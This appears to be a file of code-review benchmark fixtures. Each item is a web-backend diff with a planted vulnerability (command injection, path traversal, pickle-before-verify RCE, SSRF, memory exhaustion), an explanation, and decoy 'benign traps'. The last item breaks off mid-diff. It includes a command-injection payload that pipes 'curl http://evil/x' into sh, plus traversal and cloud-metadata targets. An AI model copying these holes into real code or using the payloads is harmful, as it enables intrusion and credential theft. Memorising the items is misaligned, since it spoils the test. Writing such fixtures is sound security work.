# Round 4 — テストフィクスチャ / Fixtures

injection/resource の難バリアント。Opus作成→Sonnet検証。

## 作成フィクスチャ

### domain: Backend web service (Python / Flask + Celery) — video media processing that shells out to ffmpeg/ffprobe to generate thumbnails and read metadata for uploaded videos.
**planted bugs:**
- `cmd-injection-1` [critical/os-command-injection] @ app/tasks/media.py, generate_thumbnail — the cmd f-string passed to subprocess.run(..., shell=True); vectors are the interpolated `timestamp` and `resolution` — The ffmpeg command is built by f-string interpolation and executed with shell=True. `timestamp` and `resolution` originate from the untrusted JSON request body in create_thumbnail (payload.get('timestamp'/'resolution')) and are passed through Celery unchanged. Neither is validated or quoted — only input_path and output_path get shlex.quote(), which is the misdirection.
  - なぜ本物: An authenticated user POSTs {"resolution": "320x240; curl http://evil/x | sh"} (or timestamp "$(id)"). Because the whole string runs under a shell, the injected command executes on the worker with the app's privileges, yielding remote code execution / data exfiltration. The default-value function signature and the shlex.quote() on the two path arguments make it look hardened, so the two unquoted user-controlled fields are easy to overlook.
**benign traps:**
- @ app/tasks/media.py, _probe_duration — subprocess.run([...ffprobe..., input_path]) — An ffprobe subprocess call that passes input_path as an argument without any quoting/escaping, which can look like the same command-injection class as the real bug. (なぜOK: It uses the list/argv form of subprocess with no shell=True, so arguments are passed directly to execve and are never interpreted by a shell. Additionally input_path is derived from a server-generated UUID storage_key, not user input. No injection is possible.)
- @ app/tasks/media.py, generate_thumbnail — output_name built from secure_filename(video.original_name) — The output filename is derived from video.original_name, a user-supplied upload name joined into a filesystem path (os.path.join(THUMB_DIR, output_name)), which looks like a path-traversal / injection sink. (なぜOK: video.original_name is passed through werkzeug.utils.secure_filename before use, which strips path separators and '..' and reduces to a safe ASCII basename. The result is also shlex.quote()'d before reaching the shell command. No traversal or injection results from this field.)

<details><summary>diff</summary>

```diff
diff --git a/app/tasks/media.py b/app/tasks/media.py
index 3a1f9c2..b7e4d10 100644
--- a/app/tasks/media.py
+++ b/app/tasks/media.py
@@ -1,10 +1,13 @@
 import os
+import shlex
 import subprocess
 import logging
 
+from werkzeug.utils import secure_filename
+
 from app.extensions import celery, db
 from app.models import Video
 
 logger = logging.getLogger(__name__)
 
 STORAGE_ROOT = os.environ["MEDIA_STORAGE_ROOT"]
 THUMB_DIR = os.path.join(STORAGE_ROOT, "thumbnails")
@@ -14,6 +17,64 @@ def _storage_path(storage_key):
     # storage_key is a server-generated UUID assigned at upload time
     return os.path.join(STORAGE_ROOT, "videos", storage_key)
 
 
+def _probe_duration(input_path):
+    """Return the duration of the video in seconds, or None if unknown."""
+    result = subprocess.run(
+        [
+            "ffprobe",
+            "-v", "error",
+            "-show_entries", "format=duration",
+            "-of", "default=noprint_wrappers=1:nokey=1",
+            input_path,
+        ],
+        capture_output=True,
+        text=True,
+        timeout=30,
+    )
+    try:
+        return float(result.stdout.strip())
+    except (TypeError, ValueError):
+        return None
+
+
+@celery.task(bind=True, max_retries=2)
+def generate_thumbnail(self, video_id, timestamp="00:00:01", resolution="320x240"):
+    """Extract a single-frame JPEG thumbnail from an uploaded video.
+
+    timestamp   -- ffmpeg seek position (HH:MM:SS), chosen by the caller
+    resolution  -- WxH output size, chosen by the caller
+    """
+    video = Video.query.get(video_id)
+    if video is None:
+        logger.warning("generate_thumbnail: video %s not found", video_id)
+        return None
+
+    input_path = _storage_path(video.storage_key)
+
+    # Derive a stable, filesystem-safe output name from the original upload.
+    base = secure_filename(video.original_name or f"{video.id}")
+    output_name = f"{os.path.splitext(base)[0]}_{resolution}.jpg"
+    output_path = os.path.join(THUMB_DIR, output_name)
+
+    duration = _probe_duration(input_path)
+    logger.info(
+        "thumbnail video=%s duration=%s ts=%s res=%s",
+        video.id, duration, timestamp, resolution,
+    )
+
+    cmd = (
+        f"ffmpeg -y -i {shlex.quote(input_path)} "
+        f"-ss {timestamp} -vframes 1 -s {resolution} "
+        f"{shlex.quote(output_path)}"
+    )
+    subprocess.run(cmd, shell=True, check=True, timeout=60)
+
+    video.thumbnail_key = output_name
+    db.session.commit()
+    return output_name
diff --git a/app/api/media_routes.py b/app/api/media_routes.py
index 8c22a01..e5b9f77 100644
--- a/app/api/media_routes.py
+++ b/app/api/media_routes.py
@@ -1,8 +1,9 @@
 from flask import Blueprint, jsonify, request
 
 from app.models import Video
 from app.api.auth import login_required
+from app.tasks.media import generate_thumbnail
 
 media_bp = Blueprint("media", __name__, url_prefix="/api/media")
 
 
@@ -22,3 +23,26 @@ def get_video(video_id):
     if video.owner_id != request.user.id:
         return jsonify({"error": "forbidden"}), 403
     return jsonify(video.to_dict())
+
+
+@media_bp.route("/videos/<video_id>/thumbnail", methods=["POST"])
+@login_required
+def create_thumbnail(video_id):
+    video = Video.query.get_or_404(video_id)
+    if video.owner_id != request.user.id:
+        return jsonify({"error": "forbidden"}), 403
+
+    payload = request.get_json(silent=True) or {}
+    timestamp = payload.get("timestamp", "00:00:01")
+    resolution = payload.get("resolution", "320x240")
+
+    job = generate_thumbnail.delay(
+        video.id,
+        timestamp=timestamp,
+        resolution=resolution,
+    )
+    return jsonify({"job_id": job.id, "status": "queued"}), 202
```
</details>

### domain: Node.js / Express REST backend — workspace file attachments (upload &amp; download feature)
**planted bugs:**
- `PT-1` [critical/path-traversal] @ src/controllers/attachments.js, downloadByName() — const filePath = path.join(STORAGE_ROOT, workspaceId, filename); with filename = req.params[0] — The wildcard route tail req.params[0] is user-controlled and is joined into the storage path without any normalization or containment check. A request like GET /workspaces/ws_12/files/../../../../etc/passwd sets filename to '../../../../etc/passwd'; path.join collapses the '..' segments, so filePath resolves outside STORAGE_ROOT/ws_12 and the file is streamed back to the attacker. No basename restriction, no path.resolve()+startsWith(STORAGE_ROOT) guard, no rejection of '..' segments.
  - なぜ本物: Express wildcard '*' matches slashes and req.params[0] contains the raw decoded tail including '../' sequences; path.join does NOT prevent traversal (it normalizes '..' by walking up directories). requireWorkspace only validates the workspaceId param format, not filename, so the attacker-controlled segment reaches the filesystem read unfiltered — a classic arbitrary-file-read (e.g. /etc/passwd, app config, other workspaces' attachments, secrets).
**benign traps:**
- @ src/controllers/attachments.js, downloadByName() — crypto.createHash('md5') — Uses MD5 to compute the ETag cache validator. A reviewer may reflexively flag 'MD5 is a broken/insecure hash' as a security finding. (なぜOK: MD5 here is used only as a non-cryptographic content fingerprint for HTTP cache validation (ETag / If-None-Match). It is not used for authentication, signatures, passwords, or integrity against an adversary. Collision resistance is irrelevant for a cache tag, so MD5 is a legitimate, common choice (Node's etag/serve-static ecosystem does the same). Not a vulnerability.)
- @ src/controllers/attachments.js, downloadByName() — Content-Disposition: attachment; filename="${path.basename(filename)}" — Interpolates a user-derived value into a response header, which looks like a response-header/HTTP-injection or content-disposition escaping risk. (なぜOK: The value is passed through path.basename() (stripping path separators) and, more importantly, only files that exist on disk get here — and every stored file's name was run through safeName() at upload time, which strips everything outside [a-zA-Z0-9._-]. So the basename can never contain quotes, CR/LF, or control characters. Additionally Node's HTTP layer throws on invalid header characters rather than emitting a split response. No injection is achievable. (This trap is independent of PT-1: the traversal reads arbitrary files but the Content-Disposition value shown is still just the sanitized basename.))

<details><summary>diff</summary>

```diff
diff --git a/src/routes/index.js b/src/routes/index.js
index 3a1f9c2..b7e4d21 100644
--- a/src/routes/index.js
+++ b/src/routes/index.js
@@ -8,10 +8,13 @@ const express = require('express');
 const router = express.Router();
 const multer = require('multer');
 const attachments = require('../controllers/attachments');
-const { requireWorkspace } = require('../middleware/workspace');
+const { requireWorkspace } = require('../middleware/workspace'); // validates :workspaceId matches /^ws_[a-z0-9]+$/ and 403s otherwise
 
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 25 * 1024 * 1024 } });
 
 router.post('/workspaces/:workspaceId/attachments', requireWorkspace, upload.single('file'), attachments.upload);
 router.get('/workspaces/:workspaceId/attachments/:id', requireWorkspace, attachments.downloadById);
+
+// New: human-friendly direct download links, e.g. /workspaces/ws_12/files/reports/q3.pdf
+// Uses a wildcard so nested attachment folders resolve to a real on-disk path.
+router.get('/workspaces/:workspaceId/files/*', requireWorkspace, attachments.downloadByName);
 
 module.exports = router;
diff --git a/src/controllers/attachments.js b/src/controllers/attachments.js
index 5c88a10..e2b90f7 100644
--- a/src/controllers/attachments.js
+++ b/src/controllers/attachments.js
@@ -1,6 +1,7 @@
 const path = require('path');
 const fs = require('fs/promises');
 const { createReadStream } = require('fs');
+const crypto = require('crypto');
 const db = require('../db');
 
 const STORAGE_ROOT = process.env.ATTACHMENT_ROOT || '/var/app/attachments';
@@ -20,6 +21,7 @@ async function upload(req, res) {
   const dir = path.join(STORAGE_ROOT, workspaceId);
   await fs.mkdir(dir, { recursive: true });
   const dest = path.join(dir, name);
   await fs.writeFile(dest, req.file.buffer);
   const row = await db.attachments.insert({ workspaceId, name, size: req.file.size });
   res.status(201).json(row);
 }
@@ -33,6 +35,44 @@ async function downloadById(req, res) {
   res.type(row.contentType || 'application/octet-stream');
   createReadStream(filePath).pipe(res);
 }
 
-module.exports = { upload, downloadById };
+// Serve an attachment by its (possibly nested) file name rather than by DB id.
+// Powers shareable links surfaced in the UI and in notification emails.
+async function downloadByName(req, res) {
+  const { workspaceId } = req.params;
+  const filename = req.params[0]; // wildcard tail, e.g. "reports/q3.pdf"
+
+  const filePath = path.join(STORAGE_ROOT, workspaceId, filename);
+
+  let stat;
+  try {
+    stat = await fs.stat(filePath);
+  } catch (err) {
+    return res.sendStatus(404);
+  }
+
+  // Cheap, stable cache validator derived from identity + size + mtime.
+  const etag = crypto
+    .createHash('md5')
+    .update(`${filePath}:${stat.size}:${stat.mtimeMs}`)
+    .digest('hex');
+
+  if (req.headers['if-none-match'] === etag) {
+    return res.sendStatus(304);
+  }
+
+  res.setHeader('ETag', etag);
+  res.setHeader(
+    'Content-Disposition',
+    `attachment; filename="${path.basename(filename)}"`
+  );
+
+  const stream = createReadStream(filePath);
+  stream.on('error', () => {
+    if (!res.headersSent) res.sendStatus(500);
+    else res.destroy();
+  });
+  stream.pipe(res);
+}
+
+module.exports = { upload, downloadById, downloadByName };
```
</details>

### domain: Python web backend — stateless signed-cookie session store for a Flask/WSGI-style app
**planted bugs:**
- `pickle-before-verify` [critical/unsafe-deserialization] @ app/sessions.py, CookieSessionStore.loads() — the line `data = pickle.loads(payload)` runs before the `hmac.compare_digest(...)` signature check — The session cookie is fully attacker-controlled (it is read straight from request.cookies via SessionMiddleware.load_session). loads() base64-decodes the cookie, splits off the trailing 32 bytes as the MAC, and calls pickle.loads on the remaining payload BEFORE verifying the HMAC. Because pickle deserialization executes arbitrary object-reconstruction code, an attacker can send a cookie whose payload is a malicious pickle (e.g. an object with a __reduce__ returning os.system) and any garbage as the trailing MAC bytes; the RCE fires during pickle.loads and the compare_digest check is never reached.
  - なぜ本物: This is a textbook deserialize-before-verify vulnerability yielding remote code execution. The presence of hmac.compare_digest makes the code *look* safe on a skim, but ordering makes the signature check dead code for the exploit path — the attacker never needs a valid signature. Reachable on every request that carries a `sid` cookie.
**benign traps:**
- @ app/middleware.py, SessionMiddleware._etag() — Uses hashlib.md5(body).hexdigest() — a broken cryptographic hash — which a reviewer may reflexively flag as a weak-crypto vulnerability. (なぜOK: MD5 here is used only as a non-cryptographic content fingerprint for a response/ETag cache (explicitly commented as not security-sensitive). Collision or preimage resistance is irrelevant for cache-key/ETag use, so this is not a security issue and does not warrant a change.)
- @ app/sessions.py, _load_ttl() — `cfg = yaml.safe_load(fh)` — A YAML deserialization call sitting right next to the pickle code, which may draw a reflexive 'unsafe yaml.load' flag, especially since the file is about (de)serialization. (なぜOK: It uses yaml.safe_load (SafeLoader), which only constructs plain scalars/lists/dicts and cannot instantiate arbitrary Python objects. The input is also a server-side config file (CONFIG_PATH), not untrusted client data. This is the correct, safe API.)
- @ app/middleware.py, load_session() — `except Exception: return {}` — A broad bare-ish except that swallows all errors and returns an empty session, which can look like error-masking / anti-pattern worth blocking. (なぜOK: For an optional, client-supplied cookie a malformed/undecodable value should degrade gracefully to 'no session' rather than 500 the request; the security-relevant BadSignature path is already logged separately. This is acceptable defensive handling, not a defect (and note it does NOT rescue the pickle bug, which triggers before any session value is trusted).)

<details><summary>diff</summary>

```diff
diff --git a/app/sessions.py b/app/sessions.py
new file mode 100644
index 0000000..a1b2c3d
--- /dev/null
+++ b/app/sessions.py
@@ -0,0 +1,63 @@
+"""Stateless session support.
+
+Instead of keeping session state server-side, we serialize the whole
+session dict into the cookie itself and protect it with an HMAC so the
+client cannot tamper with it. This removes the Redis round-trip on every
+request (see PERF-482).
+"""
+from __future__ import annotations
+
+import base64
+import hashlib
+import hmac
+import pickle
+from typing import Any
+
+import yaml
+
+from .config import CONFIG_PATH
+
+
+class BadSignature(Exception):
+    """Raised when a session cookie fails HMAC verification."""
+
+
+def _load_ttl() -> int:
+    with open(CONFIG_PATH, "r", encoding="utf-8") as fh:
+        cfg = yaml.safe_load(fh) or {}
+    return int(cfg.get("session", {}).get("ttl_seconds", 3600))
+
+
+class CookieSessionStore:
+    """Serialize a session dict into a signed, self-contained cookie.
+
+    Wire format (urlsafe-base64 of):  <serialized-payload> || <hmac-sha256>
+    """
+
+    _MAC_SIZE = 32  # sha256 digest length
+
+    def __init__(self, secret_key: bytes) -> None:
+        if not isinstance(secret_key, (bytes, bytearray)):
+            raise TypeError("secret_key must be bytes")
+        self._secret = bytes(secret_key)
+        self._ttl = _load_ttl()
+
+    def _mac(self, payload: bytes) -> bytes:
+        return hmac.new(self._secret, payload, hashlib.sha256).digest()
+
+    def dumps(self, data: dict[str, Any]) -> str:
+        payload = pickle.dumps(data, protocol=pickle.HIGHEST_PROTOCOL)
+        blob = payload + self._mac(payload)
+        return base64.urlsafe_b64encode(blob).decode("ascii")
+
+    def loads(self, cookie_value: str) -> dict[str, Any]:
+        blob = base64.urlsafe_b64decode(cookie_value.encode("ascii"))
+        payload, mac = blob[: -self._MAC_SIZE], blob[-self._MAC_SIZE :]
+        data = pickle.loads(payload)
+        if not hmac.compare_digest(mac, self._mac(payload)):
+            raise BadSignature("session signature mismatch")
+        return data
diff --git a/app/middleware.py b/app/middleware.py
index 3c4d5e6..7f8a9b0 100644
--- a/app/middleware.py
+++ b/app/middleware.py
@@ -1,10 +1,11 @@
 import hashlib
-import json
 import logging
 
+from .sessions import BadSignature, CookieSessionStore
+
 log = logging.getLogger(__name__)
 
 COOKIE_NAME = "sid"
 
 
 class SessionMiddleware:
     """Attaches ``request.session`` and persists it back into a cookie."""
 
-    def __init__(self, app, secret_key: bytes):
+    def __init__(self, app, secret_key: bytes):
         self.app = app
-        self.secret_key = secret_key
+        self.store = CookieSessionStore(secret_key)
 
     def _etag(self, body: bytes) -> str:
         # Cheap content fingerprint for the response cache; not security-sensitive.
         return hashlib.md5(body).hexdigest()
 
     def load_session(self, request):
         raw = request.cookies.get(COOKIE_NAME)
         if not raw:
             return {}
         try:
-            return json.loads(raw)
-        except ValueError:
+            return self.store.loads(raw)
+        except BadSignature:
+            log.warning("rejected tampered session cookie from %s", request.remote_addr)
+            return {}
+        except Exception:  # noqa: BLE001 - malformed cookie -> treat as no session
             return {}
 
     def save_session(self, response, session):
-        response.set_cookie(COOKIE_NAME, json.dumps(session), httponly=True)
+        response.set_cookie(COOKIE_NAME, self.store.dumps(session), httponly=True)
         return response
```
</details>

### domain: Backend web service (Node.js / Express) — a link-preview / URL-unfurl feature that fetches a user-supplied page server-side and extracts Open Graph metadata.
**planted bugs:**
- `ssrf-no-host-allowlist` [critical/SSRF (server-side request forgery)] @ src/routes/preview.js lines 15-24 (URL validation) feeding src/lib/fetchMeta.js line 8 (axios.get) — The /preview handler parses the user-supplied url and validates only the URL scheme (http/https), then passes parsed.href straight into fetchMeta(), which does axios.get on it. There is no validation of the destination host/IP: no allowlist, no blocklist of private/loopback/link-local ranges, and no DNS resolution check. An attacker can request http://169.254.169.254/latest/meta-data/iam/security-credentials/ (cloud metadata / credential theft), http://127.0.0.1:6379/ or other localhost ports, or http://10.0.0.5/ internal services. The server fetches the URL and returns parsed content (or, via error/timing differences, still enables blind SSRF port-scanning of the internal network).
  - なぜ本物: The protocol check reads like input validation but does nothing to stop internal targets — 169.254.169.254 and 127.0.0.1 are perfectly valid http: URLs. maxRedirects:3 makes it worse: even if a host allowlist were added on the initial URL, a whitelisted external page could 302-redirect to http://169.254.169.254/ and axios would follow it without re-validation. This is the canonical, exploitable SSRF pattern for an unfurl/preview feature and directly exposes cloud instance credentials.
**benign traps:**
- @ src/routes/index.js lines 10-16 — A reviewer scanning the new endpoint may flag '/preview is exposed unauthenticated', which for an SSRF sink would be alarming. (なぜOK: router.use(requireAuth) is mounted immediately before router.use('/', preview) in the same file, so the preview route is gated by session auth. Only the /health route above the middleware is public. (The SSRF is still real, but it is an authenticated-user SSRF, not an unauthenticated one — the 'no auth' claim would be a false positive.))
- @ src/routes/preview.js line 37 (req.log.warn({ err: err.message, url: parsed.href }, ...)) — User-controlled input (parsed.href) is written to the application log, which looks like a log-injection / log-forging vector. (なぜOK: This uses pino-style structured logging where the URL is passed as a bound field value, not concatenated into the message template. The logger serializes it as a JSON string value with newlines/control chars escaped, so no forged log lines. Not a real vulnerability.)
- @ src/routes/preview.js line 29 (return res.json(JSON.parse(cached))) — Calling JSON.parse on a cached value that was ultimately derived from a user-fetched page may look like untrusted deserialization. (なぜOK: The only thing ever written to that cache key is JSON.stringify(meta) on line 34, a server-produced object with three string fields. JSON.parse of JSON is not code execution or prototype pollution here, and the cache is not attacker-writable by any other path in the diff. Safe.)
- @ src/lib/fetchMeta.js line 14 (validateStatus: (s) => s >= 200 && s < 400) — Overriding axios's default validateStatus can look like the code is suppressing/ignoring error responses insecurely. (なぜOK: Accepting 2xx/3xx and letting maxRedirects handle 3xx is normal for a fetch-and-parse helper; non-2xx/3xx still throw and are caught by the caller's try/catch. This is a functional choice, not a security defect.)

<details><summary>diff</summary>

```diff
diff --git a/src/lib/fetchMeta.js b/src/lib/fetchMeta.js
new file mode 100644
index 0000000..a1b2c3d
--- /dev/null
+++ b/src/lib/fetchMeta.js
@@ -0,0 +1,30 @@
+const axios = require('axios');
+const cheerio = require('cheerio');
+
+const USER_AGENT = 'LinkPreviewBot/1.0 (+https://example.com/bot)';
+const MAX_BYTES = 2 * 1024 * 1024;
+
+async function fetchMeta(targetUrl) {
+  const res = await axios.get(targetUrl, {
+    headers: { 'User-Agent': USER_AGENT, Accept: 'text/html,application/xhtml+xml' },
+    timeout: 5000,
+    maxRedirects: 3,
+    maxContentLength: MAX_BYTES,
+    responseType: 'text',
+    validateStatus: (s) => s >= 200 && s < 400,
+  });
+
+  const $ = cheerio.load(res.data);
+  const pick = (sel, attr) => (attr ? $(sel).attr(attr) : $(sel).text()) || '';
+  const title = pick('meta[property="og:title"]', 'content') || pick('title');
+  const description = pick('meta[property="og:description"]', 'content');
+  const image = pick('meta[property="og:image"]', 'content');
+
+  return {
+    title: title.trim(),
+    description: description.trim(),
+    image: image.trim(),
+  };
+}
+
+module.exports = { fetchMeta };
diff --git a/src/routes/preview.js b/src/routes/preview.js
new file mode 100644
index 0000000..b2c3d4e
--- /dev/null
+++ b/src/routes/preview.js
@@ -0,0 +1,42 @@
+const express = require('express');
+const { fetchMeta } = require('../lib/fetchMeta');
+const cache = require('../lib/cache');
+
+const router = express.Router();
+const CACHE_TTL_SECONDS = 3600;
+
+// GET /preview?url=<page url> -> { title, description, image }
+router.get('/preview', async (req, res) => {
+  const target = req.query.url;
+  if (!target || typeof target !== 'string') {
+    return res.status(400).json({ error: 'url query parameter is required' });
+  }
+
+  let parsed;
+  try {
+    parsed = new URL(target);
+  } catch (err) {
+    return res.status(400).json({ error: 'invalid url' });
+  }
+
+  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
+    return res.status(400).json({ error: 'unsupported protocol' });
+  }
+
+  const cacheKey = `preview:${parsed.href}`;
+  const cached = await cache.get(cacheKey);
+  if (cached) {
+    return res.json(JSON.parse(cached));
+  }
+
+  try {
+    const meta = await fetchMeta(parsed.href);
+    await cache.set(cacheKey, JSON.stringify(meta), CACHE_TTL_SECONDS);
+    return res.json(meta);
+  } catch (err) {
+    req.log.warn({ err: err.message, url: parsed.href }, 'preview fetch failed');
+    return res.status(502).json({ error: 'failed to fetch preview' });
+  }
+});
+
+module.exports = router;
diff --git a/src/routes/index.js b/src/routes/index.js
index 3f4a5b6..7c8d9e0 100644
--- a/src/routes/index.js
+++ b/src/routes/index.js
@@ -1,14 +1,20 @@
 const express = require('express');
 const health = require('./health');
+const preview = require('./preview');
 const requireAuth = require('../middleware/requireAuth');
 
 const router = express.Router();
 
 // Public, unauthenticated
 router.use('/health', health);
 
+// Everything below this line requires a valid session
+router.use(requireAuth);
+
+router.use('/', preview);
+
 router.use('/account', require('./account'));
 router.use('/projects', require('./projects'));
 
 module.exports = router;
```
</details>

### domain: Python backend — document ingestion service (remote fetch + upload validation) in a Flask/Celery-style app
**planted bugs:**
- `bug-1` [critical/unbounded-memory] @ app/ingest.py, fetch_remote_document — the io.BytesIO accumulation loop over resp.iter_content — The download streams with stream=True and iter_content (which reads as streaming) but writes every chunk into an in-memory io.BytesIO buffer with no running byte cap. The only size guard is the Content-Length HEADER check, which is advisory: a server using chunked transfer-encoding omits Content-Length entirely, and a malicious/misconfigured server can send a small or absent Content-Length while streaming gigabytes. Because the actual bytes read are never counted against MAX_DOWNLOAD_BYTES, the loop buffers the entire response in RAM. build_document's len(content) check happens only AFTER the full body is already resident in memory, so it cannot prevent the OOM.
  - なぜ本物: A single request to a URL that streams a multi-GB body with no/low Content-Length inflates the worker's RSS until the process is OOM-killed. This is a remotely-triggerable denial of service; the header check gives a false sense of safety. Correct fix is to tally bytes inside the loop and abort once the running total exceeds MAX_DOWNLOAD_BYTES (and ideally stream to a temp file rather than BytesIO).
- `bug-2` [medium/resource-leak] @ app/ingest.py, fetch_remote_document — early-return/raise paths after _get returns the streamed response — resp is obtained with stream=True and is never closed. On the DocumentTooLarge path (Content-Length too large) the function raises without consuming or closing the response, and even on the success path the response object is not closed via context manager. With stream=True the underlying connection is only released back to the pool when the body is fully consumed or .close() is called.
  - なぜ本物: Repeated oversized or partially-read fetches leak pooled connections/sockets; under load the worker exhausts its connection pool and file descriptors, causing hangs. Should use `with _get(...) as resp:` or an explicit try/finally resp.close().
**benign traps:**
- @ app/ingest.py, _allowed_hosts — `f.read().splitlines()` reads the whole file — Loads an entire file fully into memory with .read(), the same pattern as the real unbounded-memory bug, which may draw a reflexive flag. (なぜOK: ALLOWED_HOSTS_PATH is a small, bundled, trusted config file shipped with the service (a host allowlist of at most a few lines). Its size is bounded and operator-controlled, not attacker-controlled, so reading it fully poses no memory risk. The lru_cache also means it is read at most once.)
- @ app/ingest.py, `@lru_cache(maxsize=256)` on _allowed_hosts — An lru_cache on a loader can look like an unbounded cache that grows with distinct inputs. (なぜOK: _allowed_hosts takes no arguments, so the cache holds exactly one entry regardless of maxsize; there is no key space to grow. It is a memoization of a constant, and maxsize is bounded anyway.)
- @ app/ingest.py, _get retry loop `for attempt in range(MAX_FETCH_RETRIES)` — A retry loop with time.sleep backoff can look like it could spin or retry unboundedly / block a worker. (なぜOK: The loop is bounded by MAX_FETCH_RETRIES (3) and only retries on requests.RequestException; total worst-case sleep is 0.5+1.0+1.5s and it then raises FetchError. It neither loops forever nor swallows non-transient errors.)

<details><summary>diff</summary>

```diff
diff --git a/app/ingest.py b/app/ingest.py
index 3a1f9c2..b7e4d10 100644
--- a/app/ingest.py
+++ b/app/ingest.py
@@ -1,10 +1,15 @@
 """Document ingestion: pull source documents from uploads or remote URLs."""
 from __future__ import annotations
 
+import io
 import hashlib
 import logging
+import time
 from dataclasses import dataclass
+from functools import lru_cache
 from pathlib import Path
+
+import requests
 
 log = logging.getLogger(__name__)
 
@@ -12,10 +17,22 @@ log = logging.getLogger(__name__)
 CHUNK_SIZE = 64 * 1024
 ALLOWED_HOSTS_PATH = Path(__file__).with_name("allowed_hosts.txt")
 
+# Reject anything the remote server claims is larger than this.
+MAX_DOWNLOAD_BYTES = 50 * 1024 * 1024  # 50 MiB
+MAX_FETCH_RETRIES = 3
+
 
 @dataclass(frozen=True)
 class Document:
     content: bytes
     sha256: str
     source: str
+
+
+class DocumentTooLarge(ValueError):
+    """Raised when a source document exceeds the configured size limit."""
+
+
+class FetchError(RuntimeError):
+    """Raised when a remote document cannot be retrieved."""
 
 
 def _digest(data: bytes) -> str:
     return hashlib.sha256(data).hexdigest()
 
 
-def build_document(content: bytes, source: str) -> Document:
-    return Document(content=content, sha256=_digest(content), source=source)
+@lru_cache(maxsize=256)
+def _allowed_hosts() -> frozenset[str]:
+    """Load the host allowlist bundled with the service."""
+    with open(ALLOWED_HOSTS_PATH, encoding="utf-8") as f:
+        return frozenset(line.strip() for line in f.read().splitlines() if line.strip())
+
+
+def build_document(content: bytes, source: str) -> Document:
+    if len(content) > MAX_DOWNLOAD_BYTES:
+        raise DocumentTooLarge(f"{source}: {len(content)} bytes exceeds limit")
+    return Document(content=content, sha256=_digest(content), source=source)
+
+
+def _get(url: str, timeout: float) -> requests.Response:
+    """GET with a small bounded retry on transient network errors."""
+    last_exc: Exception | None = None
+    for attempt in range(MAX_FETCH_RETRIES):
+        try:
+            resp = requests.get(url, stream=True, timeout=timeout)
+            resp.raise_for_status()
+            return resp
+        except requests.RequestException as exc:  # transient: back off and retry
+            last_exc = exc
+            time.sleep(0.5 * (attempt + 1))
+    raise FetchError(f"giving up on {url}: {last_exc}")
+
+
+def fetch_remote_document(url: str, *, timeout: float = 30.0) -> Document:
+    """Download a document from an allowlisted URL and return it in memory."""
+    from urllib.parse import urlparse
+
+    host = urlparse(url).hostname or ""
+    if host not in _allowed_hosts():
+        raise FetchError(f"host not allowed: {host!r}")
+
+    resp = _get(url, timeout)
+
+    declared = resp.headers.get("Content-Length")
+    if declared is not None and int(declared) > MAX_DOWNLOAD_BYTES:
+        raise DocumentTooLarge(f"{url}: server declared {declared} bytes")
+
+    buffer = io.BytesIO()
+    for chunk in resp.iter_content(chunk_size=CHUNK_SIZE):
+        buffer.write(chunk)
+
+    data = buffer.getvalue()
+    log.info("fetched %s (%d bytes)", url, len(data))
+    return build_document(data, source=url)
diff --git a/app/worker.py b/app/worker.py
index 5c2b8a1..e91d334 100644
--- a/app/worker.py
+++ b/app/worker.py
@@ -3,7 +3,7 @@ import logging
 
 from .celery_app import app
-from .ingest import build_document
+from .ingest import fetch_remote_document
 from .store import save_document
 
 log = logging.getLogger(__name__)
@@ -11,8 +11,7 @@ log = logging.getLogger(__name__)
 
 @app.task(bind=True, max_retries=3)
 def ingest_url(self, url: str) -> str:
-    resp = _legacy_http_get(url)
-    doc = build_document(resp.body, source=url)
+    doc = fetch_remote_document(url)
     save_document(doc)
     return doc.sha256
```
</details>

### domain: Python/Django e-commerce REST API backend (orders listing + CSV export)
**planted bugs:**
- `unbounded-export` [high/resource-exhaustion] @ api/orders/export.py, export_orders_csv — `orders = list(qs)` (and the full StringIO buffer) — The export endpoint materializes the merchant's entire completed-order history into a Python list with `list(qs)`, then builds the whole CSV in an in-memory StringIO buffer before returning it in a single HttpResponse. There is no LIMIT, no pagination, and no streaming. The `since` filter is optional and defaults to the full history.
  - なぜ本物: For a merchant with hundreds of thousands or millions of completed orders, `list(qs)` loads every ORM object into memory at once and the StringIO buffer holds the entire serialized CSV simultaneously — two full copies of the dataset resident in RAM. A single unauthenticated-window request (any authenticated merchant, no `since`) can OOM the worker or block it for minutes, taking down the process for all tenants. The correct pattern is StreamingHttpResponse driven by `qs.iterator(chunk_size=...)` writing row-by-row, so memory stays bounded regardless of row count.
**benign traps:**
- @ api/orders/views.py — `MAX_PAGE_SIZE = 100` -> `500` — The maximum client-controllable page size is raised 5x, which looks like it could enable a resource-exhaustion / large-response attack. (なぜOK: `_clamp_page_size` still hard-caps the value with `max(1, min(size, MAX_PAGE_SIZE))`, and `OrderListView` still slices the queryset with `qs[offset:offset+page_size]`, which translates to a SQL LIMIT/OFFSET. The load per request remains finite and bounded (at most 500 rows), it is still paginated, and 500 serialized order rows is a reasonable response size. Raising a still-enforced finite cap is not a bug and must not be flagged as resource exhaustion.)
- @ api/orders/export.py — `.select_related("customer")` — Adding select_related on a large export query might look like it worsens the query or pulls extra joined data into memory. (なぜOK: select_related here is a correctness/performance improvement: `_serialize_row` accesses `order.customer.name`, so without it each row would trigger an N+1 query. It performs a single JOIN and does not itself change the number of rows loaded. The memory problem is `list(qs)`, not the join hint — flagging select_related would be a misattribution.)
- @ api/orders/views.py — unchanged `window = qs[offset : offset + page_size]` line appearing in the diff — The slice line shows up as a removed-and-re-added line in the hunk, which can look like a subtle behavioral edit. (なぜOK: The old and new lines are byte-identical (a whitespace/no-op churn from the surrounding edit); the pagination slicing behavior is unchanged. There is nothing to flag.)

<details><summary>diff</summary>

```diff
diff --git a/api/orders/views.py b/api/orders/views.py
index 3a1f2c0..b7e4d91 100644
--- a/api/orders/views.py
+++ b/api/orders/views.py
@@ -8,9 +8,9 @@ from .serializers import OrderSerializer
 from .models import Order
 
 DEFAULT_PAGE_SIZE = 50
-MAX_PAGE_SIZE = 100
+# Bumped so ops dashboards can pull larger windows in one request.
+MAX_PAGE_SIZE = 500
 
 
 def _clamp_page_size(raw):
     """Parse and bound the client-supplied page size."""
     try:
         size = int(raw)
     except (TypeError, ValueError):
         return DEFAULT_PAGE_SIZE
     return max(1, min(size, MAX_PAGE_SIZE))
 
 
 class OrderListView(APIView):
     permission_classes = [IsAuthenticated]
 
     def get(self, request):
         page = max(1, int(request.query_params.get("page", 1)))
         page_size = _clamp_page_size(request.query_params.get("page_size"))
         offset = (page - 1) * page_size
 
         qs = (
             Order.objects.filter(merchant=request.user.merchant)
             .order_by("-created_at")
         )
